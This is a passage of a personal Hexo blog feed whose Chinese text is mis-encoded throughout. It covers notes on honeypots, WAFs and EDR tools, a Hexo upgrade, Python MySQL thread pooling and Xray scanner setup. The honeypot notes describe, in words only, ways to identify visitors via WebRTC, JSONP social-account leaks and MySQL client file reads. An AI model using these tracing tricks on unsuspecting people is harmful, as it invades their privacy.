href="https://zhuanlan.zhihu.com/p/110886405">è°ˆè°ˆèœœç½ï¼ˆè°ƒç ”ï¼‰ä¸å†…ç½‘å®‰å…¨ - çŸ¥ä¹</a>äº†è§£éƒ¨åˆ†å¼€æºèœœç½</p><p>åŠŸèƒ½æ€§å¯ä»¥å‚è€ƒ<br><a href="https://chaitin-marketing.s3.cn-north-1.amazonaws.com.cn/Chaitin_D-Sensor_White_Paper.pdf">é•¿äº­è°›å¬ç™½çš®ä¹¦</a><br><a href="https://www.moresec.cn/news/51">é»˜å®‰-ä»èœœç½å‘å±•çœ‹æ”»å‡»æ¬ºéª—åº”ç”¨è¶‹åŠ¿</a></p><ol><li>OpenCanary</li></ol><p>Python, ä¾èµ–äºtwistedçš„pythonåº“å®ç°<br>å¯ä»¥å‚è€ƒï¼š</p><ul><li>webç«¯ <a href="https://github.com/p1r06u3/opencanary_web">p1r06u3/opencanary_web: The web management platform of honeypot</a> ä½†æ˜¯ç”¨çš„python2.7</li><li><a href="http://pirogue.org/2019/01/15/opencanary_2/">opencanaryäºŒæ¬¡å¼€å‘(1)-æ—¥å¿—æ ¼å¼ | pirogue</a></li></ul><ol start="2"><li>HFish</li></ol><p>Goç¼–å†™<br>å‚è€ƒï¼š</p><ul><li>å®˜æ–¹æ–‡æ¡£ <a href="https://hfish.io/docs/#/deploy/servies">èœœç½æœåŠ¡è¯´æ˜</a></li><li>ç¨è€<a href="https://blog.c1ker.top/2019/11/15/HFish-%E8%9C%9C%E7%BD%90%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/#%E6%94%BB%E5%87%BB%E5%AD%97%E5%85%B8%E7%BB%9F%E8%AE%A1">HFish èœœç½ä½¿ç”¨å¿ƒå¾— | ciker</a></li><li>ä½¿ç”¨å‚è€ƒ<a href="https://blog.csdn.net/weixin_39190897/article/details/109398179">æ¸—é€æµ‹è¯•-Hfishèœœç½çš„æ­å»ºä¸ä½¿ç”¨</a></li></ul><h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p>å¯ä»¥ç›´æ¥çœ‹<a href="https://zhuanlan.zhihu.com/p/342756722">2021å¹´åå¤§å¼€æºwaf - çŸ¥ä¹</a></p><h3 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h3><p><a href="https://pfschina.org/wp/?p=4187">å¼€æºé˜²ç«å¢™æ¨è | éµè¡€ç”·å…’çš„BLOG</a></p><p>ä¸€èˆ¬äººå¥½åƒéƒ½æ¨èç”¨<a href="https://www.freebuf.com/sectool/214820.html">Pfsenseï¼šå…è´¹å¼€æºçš„åº”ç”¨å±‚é˜²ç«å¢™ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><h3 id="æ—¥å¿—å®¡è®¡"><a href="#æ—¥å¿—å®¡è®¡" class="headerlink" title="æ—¥å¿—å®¡è®¡"></a>æ—¥å¿—å®¡è®¡</h3><p><a href="https://github.com/allinurl/goaccess">allinurl/goaccess: GoAccess is a real-time web log analyzer and interactive viewer that runs in a terminal in *nix systems or through your browser.</a></p><ul><li>star 13.1K C 86.2%</li></ul><p><a href="https://www.cnblogs.com/xiaozi/p/13198071.html">æ¨è | 10ä¸ªå¥½ç”¨çš„Webæ—¥å¿—å®‰å…¨åˆ†æå·¥å…· - Bypass - åšå®¢å›­</a></p><h3 id="æ¼æ´æ‰«æç³»ç»Ÿ"><a href="#æ¼æ´æ‰«æç³»ç»Ÿ" class="headerlink" title="æ¼æ´æ‰«æç³»ç»Ÿ"></a>æ¼æ´æ‰«æç³»ç»Ÿ</h3><p><a href="https://www.freebuf.com/articles/web/155209.html">æœ€å¥½ç”¨çš„å¼€æºWebæ¼æ‰«å·¥å…·æ¢³ç† - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h3><p><a href="https://github.com/ComodoSecurity/openedr">ComodoSecurity/openedr: Open EDR public repository</a></p><p>æœ‰vmå¯ä»¥è¯•ç”¨<a href="https://github.com/TheHive-Project/TheHive">TheHive-Project/TheHive: TheHive: a Scalable, Open Source and Free Security Incident Response Platform</a></p><p>è¯¦è§<a href="https://heimdalsecurity.com/blog/open-source-edr-tools/">Ten Open-Source EDR Tools to Enhance Your Cyber-Resilience Factor</a></p><h2 id="èœœç½-1"><a href="#èœœç½-1" class="headerlink" title="èœœç½"></a>èœœç½</h2><h3 id="å®ç°ç›¸å…³"><a href="#å®ç°ç›¸å…³" class="headerlink" title="å®ç°ç›¸å…³"></a>å®ç°ç›¸å…³</h3><h4 id="åŠŸèƒ½ç›¸å…³"><a href="#åŠŸèƒ½ç›¸å…³" class="headerlink" title="åŠŸèƒ½ç›¸å…³"></a>åŠŸèƒ½ç›¸å…³</h4><h5 id="æº¯æº"><a href="#æº¯æº" class="headerlink" title="æº¯æº"></a>æº¯æº</h5><p>bypasså›¾ï¼Œæ¥è‡ªç¾¤å†…</p><img src="/2021/04/20/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E5%AD%A6%E4%B9%A0/XTZAT_SUO4$J$F9%7D4FR_W%7D6.jpg" class=""><p>ä¸ç¾¤å‹äº¤æµåï¼Œå­¦ä¹ åˆ°äº†<br>æº¯æºæ–¹æ³•ï¼š</p><ul><li>æ¸¸è§ˆå™¨UAè¯†åˆ«</li><li>ip</li><li>æ¸¸è§ˆå™¨ç«¯jsæ‰§è¡Œ<ul><li>webrtc</li><li>jsonp è·å–ç¤¾äº¤è´¦æˆ·çš„ä¿¡æ¯ ï¼ˆå¦‚ç™¾åº¦idï¼‰</li><li>post messageï¼ˆç±»ä¼¼jsonpï¼‰</li></ul></li><li>è¿æ¥è½¯ä»¶çš„ï¼ˆå¦‚mysqlå®¢æˆ·ç«¯ï¼‰<a href="../PermanentBox/mysql%E8%9C%9C%E7%BD%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%20%E6%91%98%E5%BD%95.md">../PermanentBox/mysqlèœœç½å®¢æˆ·ç«¯ä»»æ„æ–‡ä»¶è¯»å– æ‘˜å½•</a></li></ul><p>æ¸¸è§ˆå™¨ç«¯jsæ‰§è¡Œçš„ä¸€äº›éªšæ“ä½œï¼š</p><ul><li>ä¸»æœºè®¾ç½®proxy_passåˆ°æŸä¸ªç½‘ç«™ï¼Œnginxé…ç½®æŸä¸ªè·¯å¾„çš„jsä¸ºæœ¬æœºçš„æº¯æºjsï¼Œè¿™æ ·æ²¡æœ‰èœœç½ç‰¹å¾</li></ul><h5 id="åèœœç½è¯†åˆ«"><a href="#åèœœç½è¯†åˆ«" class="headerlink" title="åèœœç½è¯†åˆ«"></a>åèœœç½è¯†åˆ«</h5><ul><li>æ— ç—•æ¸¸è§ˆå™¨/é˜²æŒ‡çº¹æ¸¸è§ˆå™¨</li><li>jsè¯†åˆ«<ul><li><a href="https://github.com/iiiusky/AntiHoneypot-Chrome-simple">iiiusky/AntiHoneypot-Chrome-simple: Chrome èœœç½æ£€æµ‹æ’ä»¶</a></li></ul></li></ul><p>é’ˆå¯¹<a href="../RelatedBox/mysql%E8%9C%9C%E7%BD%90%E8%AF%86%E5%88%AB%20%E6%91%98%E5%BD%95.md">../RelatedBox/mysqlèœœç½è¯†åˆ« æ‘˜å½•</a>è¿›è¡Œååˆ¶</p><h5 id="ç«¯å£æµé‡è½¬å‘ï¼ˆé€ä¼ ipï¼‰"><a href="#ç«¯å£æµé‡è½¬å‘ï¼ˆé€ä¼ ipï¼‰" class="headerlink" title="ç«¯å£æµé‡è½¬å‘ï¼ˆé€ä¼ ipï¼‰"></a>ç«¯å£æµé‡è½¬å‘ï¼ˆé€ä¼ ipï¼‰</h5><blockquote><img src="/2021/04/20/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81%E5%AD%A6%E4%B9%A0/Snipaste_2021-04-22_21-43-29.png" class=""><p> æ¥æº <a href="https://mp.weixin.qq.com/s/hOy8wCXLpAavwtf6A46w4Q">èœœç½é¡¹ç›®-ç«¯å£æµé‡è½¬å‘ï¼ˆé€ä¼ ipï¼‰æ–¹æ¡ˆè°ƒç ”</a></p></blockquote><p>æ„Ÿè§‰å°±æ˜¯ä¸¤æœºå­å»ºç«‹greéš§é“åï¼Œæºæœºå­è®¾ç½®DNATï¼ˆç›®æ ‡åœ°å€è½¬æ¢ï¼‰å°†æ•°æ®åŒ…è½¬å‘åˆ°èœœç½ä¸­ï¼ˆæˆ–è€…èœœç½ç¾¤çš„ç½‘å…³æœºå­è¿™ç§ï¼Œä½¿ç”¨ç‚¹åˆ°å¤šç‚¹GREéš§é“ï¼‰ï¼Œåœ¨dockerä¸­ä¹Ÿå¯ä»¥å®ç°é€ä¼ ipçš„ï¼Œæ¥ä¸‹æ¥éš¾ç‚¹å°±æ˜¯è¯†åˆ«æ¶æ„æµé‡äº†ï¼ˆå€’ï¼‰</p><p>Greéš§é“</p><blockquote><p>é€šç”¨è·¯ç”±å°è£…æˆ– GRE æ˜¯ä¸€ç§åè®®ï¼Œç”¨äºå°†ä½¿ç”¨ä¸€ä¸ª<a href="https://www.cloudflare.com/zh-cn/learning/network-layer/what-is-routing">è·¯ç”±</a>åè®®çš„æ•°æ®åŒ…å°è£…åœ¨å¦ä¸€åè®®çš„æ•°æ®åŒ…ä¸­ã€‚â€œå°è£…â€æ˜¯æŒ‡å°†ä¸€ä¸ªæ•°æ®åŒ…åŒ…è£…åœ¨å¦ä¸€ä¸ªæ•°æ®åŒ…ä¸­ã€‚GRE æ˜¯åœ¨ç½‘ç»œä¸Šå»ºç«‹ç›´æ¥ç‚¹å¯¹ç‚¹è¿æ¥çš„ä¸€ç§æ–¹æ³•ï¼Œç›®çš„æ˜¯ç®€åŒ–å•ç‹¬ç½‘ç»œä¹‹é—´çš„è¿æ¥ã€‚é€‚ç”¨äºå„ç§ç½‘ç»œå±‚</p><p>** ä¾‹å¦‚**ï¼Œå‡è®¾ä¸€å®¶å…¬å¸éœ€è¦åœ¨ä½äºä¸¤ä¸ªä¸åŒåŠå…¬å®¤çš„å±€åŸŸç½‘ä¹‹é—´å»ºç«‹è¿æ¥ã€‚ä¸¤ä¸ª LAN éƒ½ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬çš„äº’è”ç½‘åè®®IPv6ã€‚ä½†æ˜¯ï¼Œä¸ºäº†ä»ä¸€ä¸ªåŠå…¬ç½‘ç»œåˆ°è¾¾å¦ä¸€ä¸ªåŠå…¬ç½‘ç»œï¼Œæµé‡å¿…é¡»é€šè¿‡ä¸€ä¸ªæœ‰äº›è¿‡æ—¶çš„ç½‘ç»œï¼Œä»…æ”¯æŒè¾ƒæ—§çš„ IPv4 åè®®ã€‚<br>å€ŸåŠ© GREï¼Œè¯¥å…¬å¸å¯ä»¥å°† IPv6 æ•°æ®åŒ…å°è£…åœ¨ IPv4 æ•°æ®åŒ…ä¸­ï¼Œç„¶åä¾¿å¯é€šè¿‡æ­¤ç½‘ç»œä¼ è¾“æµé‡ã€‚å›åˆ°é‚£ä¸ªç±»æ¯”ï¼ŒIPv6 æ•°æ®åŒ…æ˜¯æ±½è½¦ï¼ŒIPv4 æ•°æ®åŒ…æ˜¯æ¸¡è½®ï¼Œè€Œç¬¬ä¸‰æ–¹ç½‘ç»œåˆ™æ˜¯æ°´ã€‚</p><p>æ¥æº <a href="https://www.cloudflare.com/zh-cn/learning/network-layer/what-is-gre-tunneling/">ä»€ä¹ˆæ˜¯ GRE éš§é“ï¼Ÿ| GRE åè®®å¦‚ä½•å·¥ä½œ | Cloudflare</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexoå†å‡çº§</title>
    <link href="/2021/04/02/Hexo%E5%86%8D%E5%8D%87%E7%BA%A7/"/>
    <url>/2021/04/02/Hexo%E5%86%8D%E5%8D%87%E7%BA%A7/</url>
    
    <content type="html"><![CDATA[<p>ä»4.2.1åˆ°5.4.0<br>Warning: æ›´æ–°åfront-matterååˆ†ä¸¥æ ¼ï¼Œæˆ‘åˆæ”¹äº†å¥½ä¹…è„šæœ¬ã€‚ã€‚ã€‚ã€‚å«Œéº»çƒ¦çš„è¯·ä¸è¦æ›´æ–°ï¼Œåˆä¸æ˜¯ä¸èƒ½ç”¨.jpg</p><p>hexoç›®å½•ä¸‹æŸ¥çœ‹ç‰ˆæœ¬</p><img src="/2021/04/02/Hexo%E5%86%8D%E5%8D%87%E7%BA%A7/Snipaste_2021-04-02_14-01-39.png" class=""><p>ç›´æ¥ä¿®æ”¹ hexo init ç›®å½•ä¸‹çš„package.jsonçš„</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;dependencies&quot;</span>:Â &#123;<br><br> <span class="hljs-string">&quot;hexo&quot;</span>: <span class="hljs-string">&quot;^5.4.0&quot;</span>,<br> &#125;<br></code></pre></td></tr></table></figure><p>ç„¶ånpm updateå³å¯</p><img src="/2021/04/02/Hexo%E5%86%8D%E5%8D%87%E7%BA%A7/Snipaste_2021-04-02_14-02-22.png" class=""><blockquote><p><code>use_date_for_updated</code> is deprecated and will be removed in next major version. Please use <code>updated_option: &#39;date&#39;</code> instead. è¿™ä¸ªåœ¨  _config.ymlé‡Œä¿®æ”¹</p></blockquote><p>æŠ¥é”™<br><code>err: Error: Function yaml.safeLoad is removed in js-yaml 4. Use yaml.load instead, which is now safe by default.</code></p><p>fluidçš„é…ç½®æ–‡ä»¶ï¼Œæ›´æ–°åˆ°hexo 5.0åä¹Ÿå‘ç”Ÿäº†å˜åŒ– <a href="https://hexo.fluid-dev.com/docs/guide/#%E8%A6%86%E7%9B%96%E9%85%8D%E7%BD%AE">é…ç½®æŒ‡å— | Hexo Fluid</a></p><p>ç®€å•åœ°è¯´å°±æ˜¯åˆ é™¤æ‰<code>\source\_data\fluid_config.yml</code>å³å¯</p><p>ç‰ˆæœ¬æ›´æ–°æ”¹åŠ¨ï¼Œè¿™ä¸ªè·Ÿç€æ”¹ä¸€ä¸‹å°±å¥½äº†<br>_config.yml: banner_parallax å˜æ›´ä¸ºå±‚çº§å…³ç³»ï¼ˆä¸ºäº†é…åˆæ–°åŠŸèƒ½ï¼‰ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">banner_parallax:</span> <span class="hljs-literal">true</span><br><span class="hljs-string">+</span> <span class="hljs-attr">banner:</span><br><span class="hljs-string">+</span>   <span class="hljs-attr">parallax:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>å…¶ä»–çš„å°±æ˜¯æŒ‰ç…§ä»¥å‰çš„fluid_configé…ç½®å’Œä¿®æ”¹å•¦</p><h2 id="å‘ï¼šæ–‡ç« titleç©ºç™½"><a href="#å‘ï¼šæ–‡ç« titleç©ºç™½" class="headerlink" title="å‘ï¼šæ–‡ç« titleç©ºç™½"></a>å‘ï¼šæ–‡ç« titleç©ºç™½</h2><p>å› ä¸ºfront-matterçš„titleæ²¡å†™ã€‚ã€‚ã€‚ä»è„šæœ¬åŠ äº†è‡ªåŠ¨è¡¥ä¸Š</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pythonçº¿ç¨‹æ± è¯»å†™mysql</title>
    <link href="/2021/03/19/Python%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%AF%BB%E5%86%99mysql/"/>
    <url>/2021/03/19/Python%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%AF%BB%E5%86%99mysql/</url>
    
    <content type="html"><![CDATA[<p>åŸºäºmysql-connector-pythonï¼Œä¸»è¦æ˜¯å› ä¸ºä¸€æ¬¡å‡½æ•°è°ƒç”¨æœ‰ä¸ƒä¸ªselectè¯­å¥ï¼Œè€Œä¸€å…±æœ‰3w8æ¬¡7ä¸ªselectï¼ŒåŸå…ˆè¦è·‘ä¸¤å¤©æ‰èƒ½è·‘å®Œã€‚å…ˆåæ§½ä¸€æ³¢mysql connectorçš„åº“æ–‡æ¡£ï¼Œå…³é—­è¿æ¥å•¥çš„ä¸å’Œå»ºç«‹è¿æ¥æ”¾ä¸€èµ·ï¼Œæ‰¾äº†è€ä¹…æœ€åç™¾åº¦å‡ºæ¥çš„ã€‚ã€‚</p><h2 id="mysqlè¿æ¥æ± "><a href="#mysqlè¿æ¥æ± " class="headerlink" title="mysqlè¿æ¥æ± "></a>mysqlè¿æ¥æ± </h2><p>å»ºç«‹è¿æ¥æ± </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> mysql.connector import pooling<br>mydb = pooling.MySQLConnectionPool(<br>            <span class="hljs-attribute">host</span>=<span class="hljs-string">&quot;localhost&quot;</span>,<br>            <span class="hljs-attribute">user</span>=<span class="hljs-string">&quot;root&quot;</span>,<br>            <span class="hljs-attribute">passwd</span>=<span class="hljs-string">&quot;xxx&quot;</span>,<br>            <span class="hljs-attribute">database</span>=<span class="hljs-string">&quot;xxxxx&quot;</span>,<br>            <span class="hljs-attribute">auth_plugin</span>=<span class="hljs-string">&#x27;mysql_native_password&#x27;</span>,<br>            <span class="hljs-attribute">pool_name</span>=<span class="hljs-string">&#x27;test&#x27;</span>,<br>            <span class="hljs-attribute">pool_size</span>=32<br>        )<br></code></pre></td></tr></table></figure><p>ç”³è¯·è¿æ¥ï¼Œè·å¾—æ¸¸æ ‡ï¼Œå…³é—­æ¸¸æ ‡å’Œè¿æ¥</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">thread_connection = mydb<span class="hljs-selector-class">.get_connection</span>()<br>mycursor = thread_connection<span class="hljs-selector-class">.cursor</span>()<br><br>mycursor<span class="hljs-selector-class">.close</span>()<br>thread_connection<span class="hljs-selector-class">.close</span>()<br></code></pre></td></tr></table></figure><h2 id="çº¿ç¨‹æ± "><a href="#çº¿ç¨‹æ± " class="headerlink" title="çº¿ç¨‹æ± "></a>çº¿ç¨‹æ± </h2><p><a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html">concurrent.futures â€” å¯åŠ¨å¹¶è¡Œä»»åŠ¡ â€” Python 3.9.2 æ–‡æ¡£</a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> concurrent.futures.thread <span class="hljs-keyword">import</span> ThreadPoolExecutor<br>pool = ThreadPoolExecutor(<span class="hljs-number">16</span>)<br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æˆ‘ç”¨çš„<code>submit()</code>ï¼Œè¿™æ ·ä¼šå¯¼è‡´mysqlè¿æ¥æ± è¢«è€—å°½å¹¶ä¸”è¿˜æ²¡æœ‰ä»»ä½•æŠ¥é”™çš„æƒ…å†µï¼ˆè°ƒè¯•ä¹Ÿä¸å¥½å‘ç°é—®é¢˜åœ¨å“ªï¼‰ï¼Œç¿»çœ‹æ–‡æ¡£åç”¨äº†<code>map</code></p><blockquote><p><code>map</code>(<em>func</em>, <em>*iterables</em>, <em>timeout=None</em>, <em>chunksize=1</em>)<a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#concurrent.futures.Executor.map" title="æ°¸ä¹…é“¾æ¥è‡³ç›®æ ‡"></a><br>ç±»ä¼¼äº <a href="https://docs.python.org/zh-cn/3/library/functions.html#map" title="map"><code>map(func, *iterables)</code></a> å‡½æ•°ï¼Œé™¤äº†ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><ul><li><em>iterables</em> æ˜¯ç«‹å³æ‰§è¡Œè€Œä¸æ˜¯å»¶è¿Ÿæ‰§è¡Œçš„ï¼›</li><li><em>func</em> æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼Œå¯¹ <em>func</em> çš„å¤šä¸ªè°ƒç”¨å¯ä»¥å¹¶å‘æ‰§è¡Œã€‚</li></ul><p>å¦‚æœ <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#iterator.__next__" title="iterator.__next__"><code>__next__()</code></a> å·²è¢«è°ƒç”¨ä¸”è¿”å›çš„ç»“æœåœ¨å¯¹ <a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#concurrent.futures.Executor.map" title="concurrent.futures.Executor.map"><code>Executor.map()</code></a> çš„åŸå§‹è°ƒç”¨ç»è¿‡ <em>timeout</em> ç§’åè¿˜ä¸å¯ç”¨ï¼Œåˆ™å·²è¿”å›çš„è¿­ä»£å™¨å°†å¼•å‘ <a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#concurrent.futures.TimeoutError" title="concurrent.futures.TimeoutError"><code>concurrent.futures.TimeoutError</code></a>ã€‚ <em>timeout</em> å¯ä»¥ä¸º int æˆ– float ç±»å‹ã€‚ å¦‚æœ <em>timeout</em> æœªæŒ‡å®šæˆ–ä¸º <code>None</code>ï¼Œåˆ™ä¸é™åˆ¶ç­‰å¾…æ—¶é—´ã€‚<br>å¦‚æœ <em>func</em> è°ƒç”¨å¼•å‘ä¸€ä¸ªå¼‚å¸¸ï¼Œå½“ä»è¿­ä»£å™¨ä¸­å–å›å®ƒçš„å€¼æ—¶è¿™ä¸ªå¼‚å¸¸å°†è¢«å¼•å‘ã€‚<br>ä½¿ç”¨ <a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#concurrent.futures.ProcessPoolExecutor" title="concurrent.futures.ProcessPoolExecutor"><code>ProcessPoolExecutor</code></a> æ—¶ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šå°† <em>iterables</em> åˆ†å‰²ä»»åŠ¡å—å¹¶ä½œä¸ºç‹¬ç«‹çš„ä»»åŠ¡å¹¶æäº¤åˆ°æ‰§è¡Œæ± ä¸­ã€‚è¿™äº›å—çš„å¤§æ¦‚æ•°é‡å¯ä»¥ç”± <em>chunksize</em> æŒ‡å®šæ­£æ•´æ•°è®¾ç½®ã€‚ å¯¹å¾ˆé•¿çš„è¿­ä»£å™¨æ¥è¯´ï¼Œä½¿ç”¨å¤§çš„ <em>chunksize</em> å€¼æ¯”é»˜è®¤å€¼ 1 èƒ½æ˜¾è‘—åœ°æé«˜æ€§èƒ½ã€‚ <em>chunksize</em> å¯¹ <a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#concurrent.futures.ThreadPoolExecutor" title="concurrent.futures.ThreadPoolExecutor"><code>ThreadPoolExecutor</code></a> æ²¡æœ‰æ•ˆæœã€‚</p></blockquote><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs axapta">userlist = list(xxx)<span class="hljs-meta">#*iterablesçš„è¦</span><br>pool = ThreadPoolExecutor(<span class="hljs-number">16</span>)<br>result = pool.map(select_function, userlist)<br><span class="hljs-keyword">count</span> = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> result:<span class="hljs-meta">#çº¿ç¨‹æ­£å¸¸å®Œæˆä¼šè¿”å›Noneï¼Œprint(r)å¯ä»¥å¸®åŠ©è°ƒè¯•</span><br>    <span class="hljs-keyword">count</span> += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">print</span>(<span class="hljs-built_in">str</span>(<span class="hljs-keyword">count</span>) + <span class="hljs-string">&quot; in &quot;</span> + <span class="hljs-built_in">str</span>(len(userlist)))<br></code></pre></td></tr></table></figure><p>è¿™é‡Œé€‰æ‹©16ï¼Œæ˜¯å› ä¸ºå¡«32ä¼šå´©ï¼Œç´¢æ€§ç›´æ¥ç åŠäº†ã€‚æœ€åå†å±•ç¤ºä¸€ä¸‹mysqlçš„æƒ…å†µ</p><img src="/2021/03/19/Python%E7%BA%BF%E7%A8%8B%E6%B1%A0%E8%AF%BB%E5%86%99mysql/Snipaste_2021-03-21_20-25-58.png" class=""><h2 id="æ€§èƒ½æµ‹è¯•å¯¹æ¯”"><a href="#æ€§èƒ½æµ‹è¯•å¯¹æ¯”" class="headerlink" title="æ€§èƒ½æµ‹è¯•å¯¹æ¯”"></a>æ€§èƒ½æµ‹è¯•å¯¹æ¯”</h2><p>åº“é‡Œä¸€å…±æœ‰6wæ¡è®°å½•ï¼Œforå¾ªç¯çš„è¯è¦æ­»äººäº†ï¼Œæ‰€ä»¥åªæµ‹1000æ¡æ—¶å€™çš„é€Ÿåº¦</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">date &amp;&amp; <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3 ./</span>test.py &amp;&amp; date <br>æ—¥  <span class="hljs-number">3</span> <span class="hljs-number">21</span> <span class="hljs-number">20</span>:<span class="hljs-number">36</span>:<span class="hljs-number">01</span> CST <span class="hljs-number">2021</span><br>æ—¥  <span class="hljs-number">3</span> <span class="hljs-number">21</span> <span class="hljs-number">20</span>:<span class="hljs-number">36</span>:<span class="hljs-number">24</span> CST <span class="hljs-number">2021</span><br></code></pre></td></tr></table></figure><p>23ç§’ï¼Œç„¶åforå¾ªç¯</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">date &amp;&amp; <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/python3 ./</span>test.py &amp;&amp; date <br>æ—¥  <span class="hljs-number">3</span> <span class="hljs-number">21</span> <span class="hljs-number">20</span>:<span class="hljs-number">43</span>:<span class="hljs-number">57</span> CST <span class="hljs-number">2021</span><br>æ—¥  <span class="hljs-number">3</span> <span class="hljs-number">21</span> <span class="hljs-number">20</span>:<span class="hljs-number">45</span>:<span class="hljs-number">13</span> CST <span class="hljs-number">2021</span><br></code></pre></td></tr></table></figure><p>1åˆ†16ç§’</p><p>æš‚æ—¶å¤Ÿç”¨äº†ğŸ‘¨â€ğŸ’»</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Xray ç¤¾åŒºç‰ˆ å†å­¦ä¹ è®°å½•</title>
    <link href="/2021/03/06/Xray%20%E7%A4%BE%E5%8C%BA%E7%89%88%20%E5%86%8D%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2021/03/06/Xray%20%E7%A4%BE%E5%8C%BA%E7%89%88%20%E5%86%8D%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥å‰ä¹Ÿæœ‰ç”¨xrayæ‰«æ‰«å­¦æ ¡çš„æ¼æ´ï¼Œæœ€è¿‘æœ‰åœ¨å¼€å‘è‡ªå·±çš„æ‰«æå¹³å°ï¼Œä¼°å€Ÿæ­¤æœºä¼šå†å­¦ä¹ ã€‚</p><p><a href="https://docs.xray.cool/#/README">å®˜æ–¹æ–‡æ¡£</a></p><p>VulnTypeçš„å¤ç°åœ¨æœ€åè¾¹ã€‚</p><h2 id="ä¸‰ç§åŸºæœ¬æ¨¡å¼"><a href="#ä¸‰ç§åŸºæœ¬æ¨¡å¼" class="headerlink" title="ä¸‰ç§åŸºæœ¬æ¨¡å¼"></a>ä¸‰ç§åŸºæœ¬æ¨¡å¼</h2><h3 id="ä»£ç†æ¨¡å¼"><a href="#ä»£ç†æ¨¡å¼" class="headerlink" title="ä»£ç†æ¨¡å¼"></a>ä»£ç†æ¨¡å¼</h3><p>åˆå§‹é…ç½®è¯ä¹¦éƒ¨åˆ†çœ‹å®˜æ–¹æ–‡æ¡£å§Orzï¼Œ <a href="https://docs.xray.cool/#/tutorial/webscan_proxy">ä»£ç†æ¨¡å¼è¿›è¡Œæ‰«æ - xray å®‰å…¨è¯„ä¼°å·¥å…·æ–‡æ¡£</a></p><p>å»ºè®®é…åˆ SwitchyOmega è¿™ä¸ªæ’ä»¶ä½¿ç”¨ï¼Œå¯ä»¥éšæ„åˆ‡æ¢ä»£ç†æœåŠ¡å™¨åŠç«¯å£ã€‚</p><p><code>config.yaml</code>é…ç½®å¥½</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">mitm:<br>  restriction: <span class="hljs-meta">#Â ä»£ç†èƒ½å¤Ÿè®¿é—®çš„èµ„æºé™åˆ¶,Â ä»¥ä¸‹å„é¡¹ä¸ºç©ºè¡¨ç¤ºä¸é™åˆ¶</span><br>    hostname_allowed:Â [&#x27;*.web-security-academy.net&#x27;,&#x27;192.168.3.188&#x27;] <span class="hljs-meta">#Â å…è®¸è®¿é—®çš„Â Hostnameï¼Œæ”¯æŒæ ¼å¼å¦‚Â 